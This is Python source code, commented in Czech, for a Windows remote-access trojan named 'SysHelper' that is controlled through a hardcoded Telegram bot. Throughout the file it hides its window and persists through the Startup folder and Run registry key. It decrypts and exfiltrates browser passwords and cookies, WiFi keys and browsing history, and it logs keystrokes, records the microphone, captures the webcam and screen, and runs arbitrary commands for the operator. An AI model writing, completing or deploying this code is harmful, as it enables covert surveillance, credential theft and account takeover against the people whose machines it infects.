# ================= [STEALTH] Skryti konzole =================
import ctypes
import os
import sys

if sys.platform == "win32":
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)   # SW_HIDE - skryje okno
        ctypes.windll.kernel32.FreeConsole()           # odpoji proces od konzole
    except Exception:
        pass
try:
    if sys.stdout is None:
        sys.stdout = open(os.devnull, "w")
    if sys.stderr is None:
        sys.stderr = open(os.devnull, "w")
except Exception:
    pass
# ============================================================

import os
import sys
import re
import io
import csv
import json
import glob
import time
import shutil
import ctypes
import base64
import hashlib
import sqlite3
import threading
import platform
import getpass
import subprocess
import requests
from ctypes import wintypes

BOT_TOKEN = "8655624468:AAGce9rFcLPKQT2b2DLeYMeyc6RRdV0fLL4"
CHAT_ID   = "-1004402654326"          # napr. "123456789"

API = f"https://api.telegram.org/bot{BOT_TOKEN}"
UPD_OFFSET = 0
CURRENT_DIR = os.getcwd()
TEMP = os.environ.get("TEMP", r"C:\Windows\Temp")
CREATE_NO_WINDOW = 0x08000000
PROCS = []          # seznam (name, pid) z posledniho /show

SELF_DESTRUCT_ARMED = False
SELF_DESTRUCT_DEADLINE = 0

BROWSERS = [
    ("Chrome", r"Google\Chrome\User Data"),
    ("Edge",   r"Microsoft\Edge\User Data"),
    ("Brave",  r"BraveSoftware\Brave-Browser\User Data"),
]

# ---------------- Telegram ----------------

def tg(method, **params):
    try:
        return requests.get(f"{API}/{method}", params=params, timeout=90).json()
    except Exception:
        return {}

def send_msg(text):
    if not text:
        return
    text = str(text)
    for i in range(0, len(text), 4000):
        tg("sendMessage", chat_id=CHAT_ID, text=text[i:i + 4000])

def send_file(path):
    if os.path.isfile(path):
        with open(path, "rb") as f:
            requests.post(f"{API}/sendDocument",
                          data={"chat_id": CHAT_ID},
                          files={"document": (os.path.basename(path), f)},
                          timeout=300)
        return True
    return False

# ---------------- [STEALTH] Persistence ----------------

def install():
    """Kopie do APPDATA + Startup slozka + registry HKCU\Run (vse skryte)."""
    try:
        appdata = os.getenv("APPDATA", "")
        dest_dir = os.path.join(appdata, "SysHelper")
        os.makedirs(dest_dir, exist_ok=True)

        dest = os.path.join(dest_dir, os.path.basename(sys.argv[0]))
        src = os.path.abspath(sys.argv[0])
        if os.path.normpath(src).lower() != os.path.normpath(dest).lower():
            shutil.copy2(src, dest)

        launcher = os.path.join(dest_dir, "SysHelper.vbs")
        if dest.lower().endswith((".py", ".pyw")):
            # [STEALTH] .py -> spust pres pythonw.exe, aby se neotevrelo cmd
            pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
            if not os.path.isfile(pyw):
                pyw = sys.executable
            with open(launcher, "w", encoding="utf-8") as f:
                f.write('Set s = CreateObject("WScript.Shell")\n'
                        f's.Run """{pyw}"" "{dest}"", 0, False\n')
        else:
            # uz EXE -> spusti se primo, skryte (parametr 0 = bez okna)
            with open(launcher, "w", encoding="utf-8") as f:
                f.write(f'CreateObject("WScript.Shell").Run """{dest}""", 0, False\n')

        startup = os.path.join(appdata, "Microsoft", "Windows",
                               "Start Menu", "Programs", "Startup")
        os.makedirs(startup, exist_ok=True)
        shutil.copy2(launcher, os.path.join(startup, "SysHelper.vbs"))

        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SysHelper", 0, winreg.REG_SZ,
                          f'wscript.exe "{launcher}"')
        winreg.CloseKey(key)
        return True
    except Exception:
        return False

# ---------------- Zakladni prikazy ----------------

def run_cmd(cmd):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                           cwd=CURRENT_DIR, timeout=120, creationflags=CREATE_NO_WINDOW)
        out = (p.stdout or "") + (p.stderr or "")
        return out if out.strip() else "[OK - zadny vystup]"
    except subprocess.TimeoutExpired:
        return "[Timeout 120 s]"
    except Exception as e:
        return f"[Chyba] {e}"

def screenshot():
    out = os.path.join(TEMP, "syshelper_shot.png")
    ps = ("Add-Type -AssemblyName System.Windows.Forms;"
          "Add-Type -AssemblyName System.Drawing;"
          "$b = New-Object System.Drawing.Bitmap("
          "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,"
          "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);"
          "$g = [System.Drawing.Graphics]::FromImage($b);"
          "$g.CopyFromScreen(0,0,0,0,$b.Size);"
          f'$b.Save("{out}");')
    try:
        subprocess.run(["powershell", "-NoProfile", "-WindowStyle", "Hidden",
                        "-Command", ps], capture_output=True, timeout=30,
                       creationflags=CREATE_NO_WINDOW)
    except Exception:
        pass
    return out

# ---------------- [C] Webkamera ----------------

def webcam_shot():
    """Foto z webkamery pres legacy AVIcap API -> BMP."""
    out = os.path.join(TEMP, f"syshelper_cam_{int(time.time())}.bmp")
    try:
        avicap = ctypes.windll.avicap32
        user32 = ctypes.windll.user32

        avicap.capCreateCaptureWindowW.argtypes = [
            wintypes.LPCWSTR, wintypes.DWORD,
            ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int,
            wintypes.HWND, ctypes.c_int]
        avicap.capCreateCaptureWindowW.restype = wintypes.HWND

        user32.SendMessageW.argtypes = [
            wintypes.HWND, wintypes.UINT,
            wintypes.WPARAM, wintypes.LPARAM]

        WM_CAP_DRIVER_CONNECT    = 0x040A
        WM_CAP_DRIVER_DISCONNECT = 0x040B
        WM_CAP_SAVEDIB           = 0x0419

        hwnd = avicap.capCreateCaptureWindowW(
            "SysHelperCam", 0, 0, 0, 640, 480, 0, 0)
        if not hwnd:
            return None

        if not user32.SendMessageW(hwnd, WM_CAP_DRIVER_CONNECT, 0, 0):
            user32.DestroyWindow(hwnd)
            return None

        time.sleep(1.2)   # nechat kameru rozjet
        path_ptr = ctypes.c_char_p(out.encode("utf-8"))
        user32.SendMessageW(hwnd, WM_CAP_SAVEDIB, 0, path_ptr)
        user32.SendMessageW(hwnd, WM_CAP_DRIVER_DISCONNECT, 0, 0)
        user32.DestroyWindow(hwnd)

        if os.path.isfile(out) and os.path.getsize(out) > 1000:
            return out
        try:
            os.remove(out)
        except Exception:
            pass
    except Exception:
        pass
    return None

# ---------------- [1] Info o zarizeni ----------------

def get_info():
    lines = []
    try:
        lines.append(f"Uzivatel : {getpass.getuser()}")
        lines.append(f"Pocitac  : {platform.node()}")
        lines.append(f"OS       : {platform.system()} {platform.release()} ({platform.version()})")
        lines.append(f"Arch     : {platform.machine()}")

        uptime_s = ctypes.windll.kernel32.GetTickCount64() // 1000
        lines.append(f"Uptime   : {uptime_s // 3600} h {uptime_s % 3600 // 60} min")

        import winreg
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                               r"HARDWARE\DESCRIPTION\System\CentralProcessor\0")
            cpu = winreg.QueryValueEx(k, "ProcessorNameString")[0].strip()
            lines.append(f"CPU      : {cpu}")
        except Exception:
            lines.append(f"CPU      : {platform.processor()}")

        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [("dwLength", ctypes.c_ulong),
                        ("dwMemoryLoad", ctypes.c_ulong),
                        ("ullTotalPhys", ctypes.c_ulonglong),
                        ("ullAvailPhys", ctypes.c_ulonglong),
                        ("ullTotalPageFile", ctypes.c_ulonglong),
                        ("ullAvailPageFile", ctypes.c_ulonglong),
                        ("ullTotalVirtual", ctypes.c_ulonglong),
                        ("ullAvailVirtual", ctypes.c_ulonglong),
                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
        m = MEMORYSTATUSEX()
        m.dwLength = ctypes.sizeof(m)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m))
        lines.append(f"RAM      : {m.ullTotalPhys / 1024**3:.1f} GB")

        try:
            gpu = subprocess.run(
                ["powershell", "-NoProfile", "-Command",
                 "(Get-CimInstance Win32_VideoController).Name"],
                capture_output=True, text=True, timeout=30,
                creationflags=CREATE_NO_WINDOW).stdout.strip()
            lines.append(f"GPU      : {gpu.splitlines()[0] if gpu else 'N/A'}")
        except Exception:
            pass

        usage = shutil.disk_usage(os.environ.get("SystemDrive", "C:\\"))
        lines.append(f"Disk C:  : {usage.total / 1024**3:.0f} GB (volno {usage.free / 1024**3:.0f} GB)")

        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                               r"SOFTWARE\Microsoft\Cryptography")
            lines.append(f"HWID     : {winreg.QueryValueEx(k, 'MachineGuid')[0]}")
        except Exception:
            pass

        try:
            ip = requests.get("https://api.ipify.org", timeout=10).text
            geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
            lines.append(f"IP       : {ip} | {geo.get('country','?')}, {geo.get('city','?')} | ISP: {geo.get('isp','?')}")
        except Exception:
            lines.append("IP       : N/A")

        try:
            av = subprocess.run(
                ["powershell", "-NoProfile", "-Command",
                 "(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct).displayName"],
                capture_output=True, text=True, timeout=30,
                creationflags=CREATE_NO_WINDOW).stdout.strip()
            lines.append(f"AV       : {av or 'N/A'}")
        except Exception:
            pass
    except Exception as e:
        lines.append(f"Chyba: {e}")
    return "\n".join(lines)

# ---------------- [2] WiFi hesla ----------------

def dump_wifi():
    try:
        out = subprocess.run(["netsh", "wlan", "show", "profiles"],
                             capture_output=True, text=True,
                             creationflags=CREATE_NO_WINDOW).stdout
    except Exception as e:
        return f"[Chyba] {e}"
    names = re.findall(r"^\s*(?:All User Profile|Profil všech uživatelů)\s*:\s*(.+?)\s*$",
                       out, re.M | re.I)
    if not names:
        return "[?] Zadne WiFi profily nenalezeny (nebo chybi WiFi adapter)."
    lines = []
    for name in names:
        try:
            p = subprocess.run(["netsh", "wlan", "show", "profile",
                                f'name="{name}"', "key=clear"],
                               capture_output=True, text=True,
                               creationflags=CREATE_NO_WINDOW).stdout
            m = re.search(r"(?:Key Content|Obsah klíče)\s*:\s*(.+)", p, re.M | re.I)
            pwd = m.group(1).strip() if m else "(prazdne / potreba admin)"
        except Exception:
            pwd = "(chyba cteni)"
        lines.append(f"{name} : {pwd}")
    return "\n".join(lines)

# ---------------- Sifrovani prohlizecu (DPAPI + AES) ----------------

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_char))]

def dpapi_unprotect(blob):
    if not blob:
        return None
    buf = ctypes.create_string_buffer(blob, len(blob))
    din = DATA_BLOB(len(blob), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    dout = DATA_BLOB()
    if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(din), None, None, None, None, 0, ctypes.byref(dout)):
        data = ctypes.string_at(dout.pbData, dout.cbData)
        ctypes.windll.kernel32.LocalFree(dout.pbData)
        return data
    return None

def get_master_key(local_state_path):
    with open(local_state_path, "r", encoding="utf-8") as f:
        ls = json.load(f)
    enc = base64.b64decode(ls["os_crypt"]["encrypted_key"])
    enc = enc[5:]                       # odstran "DPAPI" prefix
    return dpapi_unprotect(enc)

def decrypt_password(enc_value, key):
    if not enc_value:
        return ""
    if enc_value[:3] in (b"v10", b"v11"):           # AES-GCM (Chrome 80+)
        from Crypto.Cipher import AES
        nonce, tag = enc_value[3:15], enc_value[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(enc_value[15:-16], tag).decode("utf-8", "ignore")
    if enc_value[:3] == b"v20":
        return "[v20 - app-bound sifrovani, nelze bez specialniho servisu]"
    blob = dpapi_unprotect(enc_value)               # stary format (DPAPI primo)
    return blob.decode("utf-8", "ignore") if blob else ""

def decrypt_cookie(enc_value, key):
    if not enc_value:
        return ""
    if enc_value[:3] in (b"v10", b"v11"):           # AES-128-CBC, klic = SHA256(master + b"cookies")[:16]
        from Crypto.Cipher import AES
        iv = enc_value[3:15]
        cipher = AES.new(hashlib.sha256(key + b"cookies").digest()[:16],
                         AES.MODE_CBC, iv=iv)
        pad = cipher.decrypt(enc_value[15:])
        # PKCS7 pad, fallback na nulove doplneni
        try:
            if pad and 0 < pad[-1] < 16 and pad[-pad[-1]:] == pad[-1:] * pad[-1]:
                pad = pad[:-pad[-1]]
            else:
                pad = pad.rstrip(b"\x00")
        except Exception:
            pass
        return pad.decode("utf-8", "ignore")
    if enc_value[:3] == b"v20":
        return "[v20 - app-bound sifrovani, nelze]"
    blob = dpapi_unprotect(enc_value)
    return blob.decode("utf-8", "ignore") if blob else ""

def copy_db(path):
    tmp = os.path.join(TEMP, f"syshelper_{int(time.time()*1000)}_{os.getpid()}.db")
    shutil.copy2(path, tmp)
    return tmp

def browser_profiles(base):
    if not os.path.isdir(base):
        return []
    profs = [d for d in os.listdir(base)
             if d == "Default" or d.startswith("Profile")]
    return profs or ["Default"]

# ---------------- [2] Hesla prohlizecu ----------------

def dump_passwords():
    lines, total = [], 0
    for name, rel in BROWSERS:
        base = os.path.join(os.getenv("LOCALAPPDATA", ""), rel)
        if not os.path.isdir(base):
            continue
        local_state = os.path.join(base, "Local State")
        if not os.path.isfile(local_state):
            lines.append(f"=== {name}: chybi Local State ===")
            continue
        try:
            key = get_master_key(local_state)
        except Exception as e:
            lines.append(f"=== {name}: nelze ziskat klic ({e}) ===")
            continue
        for prof in browser_profiles(base):
            login_db = os.path.join(base, prof, "Login Data")
            if not os.path.isfile(login_db):
                continue
            try:
                tmp = copy_db(login_db)
                con = sqlite3.connect(tmp)
                rows = con.execute(
                    "SELECT origin_url, username_value, password_value "
                    "FROM logins").fetchall()
                con.close()
                os.remove(tmp)
            except Exception as e:
                lines.append(f"=== {name}/{prof}: chyba cteni ({e}) ===")
                continue
            found = 0
            for url, user, pwd_enc in rows:
                if not user and not pwd_enc:
                    continue
                try:
                    pwd = decrypt_password(pwd_enc, key)
                except Exception:
                    pwd = "[nelze desifrovat]"
                lines.append(f"{url} | {user} | {pwd}")
                found += 1
            total += found
            lines.insert(0, f"--- {name} ({prof}): {found} zaznamu ---")
    lines.append(f"CELKEM: {total} hesiel")
    if not any("--- " in l for l in lines):
        return "[?] Chrome/Edge/Brave nenalezeny."
    out = "\n".join(lines)
    if len(out) <= 3900:
        return out
    p = os.path.join(TEMP, "passwords_dump.txt")
    with open(p, "w", encoding="utf-8") as f:
        f.write(out)
    send_file(p)
    os.remove(p)
    return f"[OK] {total} hesiel - poslano jako soubor."

# ---------------- [B] Cookies prohlizecu ----------------

def dump_cookies():
    lines, total = [], 0
    for name, rel in BROWSERS:
        base = os.path.join(os.getenv("LOCALAPPDATA", ""), rel)
        if not os.path.isdir(base):
            continue
        local_state = os.path.join(base, "Local State")
        if not os.path.isfile(local_state):
            continue
        try:
            key = get_master_key(local_state)
        except Exception:
            continue
        for prof in browser_profiles(base):
            cookie_db = None
            for cand in (os.path.join(base, prof, "Network", "Cookies"),
                         os.path.join(base, prof, "Cookies")):
                if os.path.isfile(cand):
                    cookie_db = cand
                    break
            if not cookie_db:
                continue
            try:
                tmp = copy_db(cookie_db)
                con = sqlite3.connect(tmp)
                rows = con.execute(
                    "SELECT host_key, name, encrypted_value "
                    "FROM cookies").fetchall()
                con.close()
                os.remove(tmp)
            except Exception as e:
                lines.append(f"=== {name}/{prof}: chyba cteni ({e}) ===")
                continue
            found = 0
            for host, cname, cval_enc in rows:
                if not cval_enc:
                    continue
                try:
                    val = decrypt_cookie(cval_enc, key)
                except Exception:
                    val = "[nelze desifrovat]"
                if val.startswith("[v20"):
                    continue            # app-bound - preskocit, jen by spamovalo
                lines.append(f"{host}\t{cname}\t{val}")
                found += 1
            total += found
            lines.insert(0, f"--- {name} ({prof}): {found} cookies ---")
    if not any("--- " in l for l in lines):
        return "[?] Cookies nenalezeny."
    out = "\n".join(lines)
    if len(out) <= 3900:
        return out
    p = os.path.join(TEMP, "cookies_dump.txt")
    with open(p, "w", encoding="utf-8") as f:
        f.write(out)
    send_file(p)
    os.remove(p)
    return f"[OK] {total} cookies - poslano jako soubor."

# ---------------- [K] Windows produktovy klic ----------------

def decode_product_key(dpid):
    """Base24 dekoder DigitalProductId -> XXXXX-XXXXX-XXXXX-XXXXX-XXXXX."""
    key = bytearray(dpid)[52:67]
    key[14] &= 0xF7                      # smazat bit "is Win8+"
    chars = "BCDFGHJKMPQRTVWXY2346789"
    pk = ""
    for i in range(24, -1, -1):
        cur = 0
        for j in range(14, -1, -1):
            cur = cur * 256 + key[j]
            key[j] = cur // 24
            cur %= 24
        pk = chars[cur] + pk
    return "-".join([pk[1:6], pk[6:11], pk[11:16], pk[16:21], pk[21:26]])

def get_windows_key():
    lines = []
    for sub, label in (("DigitalProductId", "Klic (instalace)"),
                       ("DigitalProductId4", "Klic (OA3/OEM)")):
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                               r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
            val, _ = winreg.QueryValueEx(k, sub)
            lines.append(f"{label}: {decode_product_key(val)}")
        except Exception as e:
            lines.append(f"{label}: N/A ({e})")
    return "\n".join(lines)

# ---------------- [5] Historie hledani ----------------

def chrome_time(us):
    try:
        import datetime
        return datetime.datetime.utcfromtimestamp(
            us / 1_000_000 - 11644473600).strftime("%Y-%m-%d %H:%M")
    except Exception:
        return "?"

def dump_history(n=20):
    n = max(1, min(n, 200))
    lines = []
    for name, rel in BROWSERS:
        base = os.path.join(os.getenv("LOCALAPPDATA", ""), rel)
        if not os.path.isdir(base):
            continue
        for prof in browser_profiles(base):
            hist_db = os.path.join(base, prof, "History")
            if not os.path.isfile(hist_db):
                continue
            try:
                tmp = copy_db(hist_db)
                con = sqlite3.connect(tmp)
                rows = con.execute(
                    "SELECT url, title, last_visit_time FROM urls "
                    "WHERE last_visit_time > 0 "
                    "ORDER BY last_visit_time DESC LIMIT ?", (n,)).fetchall()
                con.close()
                os.remove(tmp)
            except Exception as e:
                lines.append(f"=== {name}/{prof}: chyba ({e}) ===")
                continue
            lines.append(f"=== {name} ({prof}) ===")
            for url, title, t in rows:
                lines.append(f"[{chrome_time(t)}] {url} | {title or ''}")
    if not lines:
        return "[?] Historie nenalezena."
    out = "\n".join(lines)
    if len(out) <= 3900:
        return out
    p = os.path.join(TEMP, "history_dump.txt")
    with open(p, "w", encoding="utf-8") as f:
        f.write(out)
    send_file(p)
    os.remove(p)
    return f"[OK] Historie poslana jako soubor."

# ---------------- [3] Mikrofon ----------------

class MicRecorder:
    def __init__(self):
        self.stop_evt = threading.Event()
        self.thread = None

    def is_running(self):
        return bool(self.thread and self.thread.is_alive())

    def start(self):
        if self.is_running():
            return "[OK] Uz nahravam."
        self.stop_evt.clear()
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()
        return "[OK] Nahravani spusteno - kazde 2 minuty poslu audio."

    def stop(self):
        if not self.is_running():
            return "[OK] Nahravani nebezi."
        self.stop_evt.set()
        self.thread.join(timeout=8)
        return "[OK] Nahravani zastaveno."

    def _loop(self):
        try:
            import pyaudio
            import wave
        except Exception as e:
            send_msg(f"[Chyba] pyaudio: {e}")
            return
        try:
            p = pyaudio.PyAudio()
        except Exception as e:
            send_msg(f"[Chyba] PyAudio init: {e}")
            return
        rate, chunk = 16000, 4096
        try:
            while not self.stop_evt.is_set():
                try:
                    stream = p.open(format=pyaudio.paInt16, channels=1,
                                    rate=rate, input=True,
                                    frames_per_buffer=chunk)
                except Exception as e:
                    send_msg(f"[Chyba mic] {e}")
                    return
                frames, collected, target = [], 0, rate * 120
                while collected < target and not self.stop_evt.is_set():
                    try:
                        data = stream.read(chunk, exception_on_overflow=False)
                    except Exception:
                        break
                    frames.append(data)
                    collected += len(data) // 2
                stream.stop_stream()
                stream.close()
                if frames and not self.stop_evt.is_set():
                    tmp = os.path.join(TEMP, f"rec_{int(time.time())}.wav")
                    wf = wave.open(tmp, "wb")
                    wf.setnchannels(1)
                    wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
                    wf.setframerate(rate)
                    wf.writeframes(b"".join(frames))
                    wf.close()
                    send_file(tmp)
                    try:
                        os.remove(tmp)
                    except Exception:
                        pass
        finally:
            p.terminate()

recorder = MicRecorder()

# ---------------- [4] Keylogger (REKONSTRUKCE) ----------------

class Keylogger:
    """Jednoduchy keylogger pres GetAsyncKeyState (bez zavislosti)."""
    def __init__(self):
        self.running = False
        self.thread = None
        self.log_path = os.path.join(TEMP, "syshelper_keys.txt")

    def is_running(self):
        return bool(self.thread and self.thread.is_alive())

    def start(self):
        if self.is_running():
            return "[OK] Keylogger uz bezi."
        self.running = True
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()
        return "[OK] Keylogger spusten (flush kazdych 5 min)."

    def stop(self):
        if not self.is_running():
            return "[OK] Keylogger nebezi."
        self.running = False
        self.thread.join(timeout=8)
        return self._send_log()

    def _send_log(self):
        try:
            if os.path.isfile(self.log_path) and os.path.getsize(self.log_path) > 0:
                send_file(self.log_path)
                try:
                    os.remove(self.log_path)
                except Exception:
                    pass
                return "[OK] Keylogger zastaven, log odeslan."
            return "[OK] Keylogger zastaven (prazdny log)."
        except Exception as e:
            return f"[Chyba] {e}"

    def _loop(self):
        user32 = ctypes.windll.user32
        special = {
            0x08: "[BACKSPACE]", 0x09: "[TAB]", 0x0D: "\n", 0x1B: "[ESC]",
            0x20: " ", 0x2E: "[DEL]", 0x90: "[CAPSLOCK]",
            0xA0: "[SHIFT]", 0xA1: "[SHIFT]", 0xA2: "[CTRL]", 0xA3: "[CTRL]",
            0xA4: "[ALT]", 0xA5: "[ALT]", 0x5B: "[WIN]", 0x5C: "[WIN]",
            0x25: "[LEFT]", 0x26: "[UP]", 0x27: "[RIGHT]", 0x28: "[DOWN]",
            0x24: "[HOME]", 0x23: "[END]", 0x21: "[PGUP]", 0x22: "[PGDN]",
        }
        fh = None
        try:
            fh = open(self.log_path, "a", encoding="utf-8", errors="ignore")
            last_send = time.time()
            while self.running:
                for code in range(8, 256):
                    try:
                        if user32.GetAsyncKeyState(code) & 1:   # stisk od posledniho pruzkumu
                            if code in special:
                                ch = special[code]
                            elif 0x30 <= code <= 0x39:          # 0-9
                                ch = chr(code)
                            elif 0x41 <= code <= 0x5A:          # A-Z
                                ch = chr(code)
                            elif 0x60 <= code <= 0x69:          # numpad 0-9
                                ch = chr(code - 0x30)
                            elif 0x70 <= code <= 0x87:          # F1-F24
                                ch = f"[F{code - 0x6F}]"
                            else:
                                continue
                            fh.write(ch)
                            fh.flush()
                    except Exception:
                        pass
                # flush kazdych 5 minut = odeslat log a vycistit
                if time.time() - last_send >= 300:
                    fh.flush()
                    fh.close()
                    fh = None
                    self._send_log()
                    fh = open(self.log_path, "a", encoding="utf-8", errors="ignore")
                    last_send = time.time()
                time.sleep(0.01)
        except Exception:
            pass
        finally:
            if fh:
                try:
                    fh.close()
                except Exception:
                    pass

keylogger = Keylogger()

# ---------------- [6] Procesy (REKONSTRUKCE) ----------------

def show_processes():
    global PROCS
    try:
        out = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "Get-Process | Select-Object Id,ProcessName | ConvertTo-Csv -NoTypeInformation"],
            capture_output=True, text=True, timeout=60,
            creationflags=CREATE_NO_WINDOW).stdout
        rows = [r for r in csv.reader(io.StringIO(out))]
        if len(rows) < 2:
            return "[?] Zadne procesy."
        PROCS = [(r[1], r[0]) for r in rows[1:] if len(r) >= 2]
        return "\n".join(f"{i}: {name} (PID {pid})"
                         for i, (name, pid) in enumerate(PROCS))
    except Exception as e:
        return f"[Chyba] {e}"

def kill_process(idx):
    try:
        i = int(idx)
        if not (0 <= i < len(PROCS)):
            return "[Chyba] Spatny index. Pouzij /show"
        name, pid = PROCS[i]
        subprocess.run(["taskkill", "/F", "/PID", str(pid)],
                       capture_output=True, timeout=30,
                       creationflags=CREATE_NO_WINDOW)
        return f"[OK] Zabit: {name} (PID {pid})"
    except Exception as e:
        return f"[Chyba] {e}"

# ---------------- [7] Self-destruct (REKONSTRUKCE) ----------------

def do_self_destruct():
    """Smaze vse (kopie, launchery, registry, logy) a ukonci proces."""
    try:
        keylogger.stop()
        recorder.stop()
    except Exception:
        pass
    try:
        for folder in (os.path.join(os.getenv("APPDATA", ""), "SysHelper"),
                       os.path.join(os.getenv("APPDATA", ""), "Microsoft",
                                    "Windows", "Start Menu", "Programs",
                                    "Startup")):
            if os.path.isdir(folder):
                for f in os.listdir(folder):
                    if "syshelper" in f.lower():
                        try:
                            os.remove(os.path.join(folder, f))
                        except Exception:
                            pass
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE)
        try:
            winreg.DeleteValue(k, "SysHelper")
        except Exception:
            pass
        winreg.CloseKey(k)
    except Exception:
        pass
    try:
        for f in glob.glob(os.path.join(TEMP, "syshelper_*")):
            try:
                os.remove(f)
            except Exception:
                pass
    except Exception:
        pass
    send_msg("[OK] Odinstalovano.")
    os._exit(0)

# ---------------- [8] Zpracovani prikazu ----------------

def handle(text):
    if text == "/self-destruct":
        SELF_DESTRUCT_ARMED = True
        SELF_DESTRUCT_DEADLINE = time.time() + 120
        return ("[POZOR] Opravdu me chces odinstalovat?\n"
                "Smazu se z registru, Startup slozky, smazu logy i sebe.\n"
                "Napis YES pro potvrzeni (platnost 2 minuty), NO pro zruseni.")

    if text.startswith("/cmd "):
        return run_cmd(text[5:].strip())

    if text == "/info":
        return get_info()

    if text == "/wifi":
        return dump_wifi()

    if text == "/passwords":
        return dump_passwords()

    if text == "/browsers":
        return dump_cookies()

    if text == "/keys":
        return get_windows_key()

    if text.startswith("/history"):
        try:
            n = int(text.split()[1]) if len(text.split()) > 1 else 20
        except ValueError:
            n = 20
        return dump_history(n)

    if text == "/record" or text == "/record start":
        return recorder.start()
    if text == "/record stop":
        return recorder.stop()

    if text == "/webcam":
        p = webcam_shot()
        return ("[OK] Foto z webkamery odeslano"
                if p and send_file(p)
                else "[Chyba] Kamera nedostupna (nebo ji uz pouziva jiny program)")

    if text == "/keylog" or text == "/keylog start":
        return keylogger.start()
    if text == "/keylog stop":
        return keylogger.stop()

    if text == "/show":
        return show_processes()

    if text.startswith("/kill "):
        return kill_process(text[6:].strip())

    if text == "/ss" or text == "/screenshot":
        return ("[OK] Screenshot odeslan" if send_file(screenshot())
                else "[Chyba] Screenshot")

    if text == "/ls":
        try:
            items = os.listdir(CURRENT_DIR)
            return "\n".join(items) if items else "[prazdna slozka]"
        except Exception as e:
            return f"[Chyba] {e}"

    if text.startswith("/cd "):
        try:
            os.chdir(os.path.abspath(text[4:].strip()))
            CURRENT_DIR = os.getcwd()
            return f"[OK] CWD: {CURRENT_DIR}"
        except Exception as e:
            return f"[Chyba] {e}"

    if text.startswith("/upload "):
        path = text[8:].strip()
        return ("[OK] Soubor odeslan" if send_file(path)
                else f"[Chyba] Soubor nenalezen: {path}")

    if text.startswith("/download "):
        url = text[10:].strip()
        try:
            r = requests.get(url, timeout=60)
            r.raise_for_status()
            name = url.split("?")[0].split("/")[-1] or "stazeny_soubor"
            p = os.path.join(TEMP, name)
            with open(p, "wb") as f:
                f.write(r.content)
            send_file(p)
            return f"[OK] Stazeno {len(r.content)} B a odeslano."
        except Exception as e:
            return f"[Chyba] {e}"

    if text == "/persist":
        return ("[OK] Persistenca znovu nastavena" if install()
                else "[Chyba] Persistenca")

    if text == "/exit":
        keylogger.stop()
        recorder.stop()
        send_msg("[OK] Koncim.")
        os._exit(0)

    if text == "/help":
        return (
            "/info          - info o zarizeni\n"
            "/wifi          - WiFi site a hesla\n"
            "/passwords     - hesla Chrome/Edge/Brave (soubor)\n"
            "/browsers      - cookies Chrome/Edge/Brave (soubor)\n"
            "/keys          - Windows produktovy klic\n"
            "/history [n]   - historie hledani (vychozi 20)\n"
            "/record start  - nahravani mikrofonu (2-min segmenty WAV)\n"
            "/record stop   - zastavit nahravani\n"
            "/webcam        - foto z webkamery\n"
            "/keylog start  - zapnout keylogger (flush kazdych 5 min)\n"
            "/keylog stop   - zastavit a poslat log\n"
            "/show          - bezici procesy (cislovane)\n"
            "/kill <cislo>  - ukoncit proces z /show\n"
            "/ss            - screenshot obrazovky\n"
            "/self-destruct - odinstalovat (potvrzeni YES/NO)\n"
            "/cmd <prikaz>  - prikaz v cmd\n"
            "/ls, /cd <cesta>\n"
            "/upload <cesta>    - soubor ze stroje sem\n"
            "/download <url>    - stahnout a poslat soubor\n"
            "/persist       - znovu nastavit start\n"
            "/exit          - ukoncit proces (bez mazani)\n"
            "/help          - tento prehled"
        )

    return "[?] Neznamy prikaz. Pouzijte /help"

# ---------------- Main ----------------

def main():
    global UPD_OFFSET, SELF_DESTRUCT_ARMED, SELF_DESTRUCT_DEADLINE
    install()
    send_msg("[OK] SysHelper spusten. CWD: " + CURRENT_DIR)

    while True:
        data = tg("getUpdates", offset=UPD_OFFSET, timeout=50)
        for upd in data.get("result", []):
            UPD_OFFSET = upd["update_id"] + 1
            msg = upd.get("message", {})
            if (str(msg.get("chat", {}).get("id")) == str(CHAT_ID)
                    and msg.get("text")):
                text = msg["text"]

                # ---- cekani na potvrzeni self-destructu ----
                if SELF_DESTRUCT_ARMED:
                    t = text.strip().upper()
                    if time.time() > SELF_DESTRUCT_DEADLINE:
                        SELF_DESTRUCT_ARMED = False
                        send_msg("[OK] Self-destruct vyprsel - zruseno.")
                    elif t == "YES":
                        SELF_DESTRUCT_ARMED = False
                        do_self_destruct()      # nevrati se - ukonci proces
                    elif t == "NO":
                        SELF_DESTRUCT_ARMED = False
                        send_msg("[OK] Self-destruct zrusen.")
                    else:
                        send_msg("[?] Self-destruct ceka na potvrzeni - napis YES nebo NO.")
                    continue

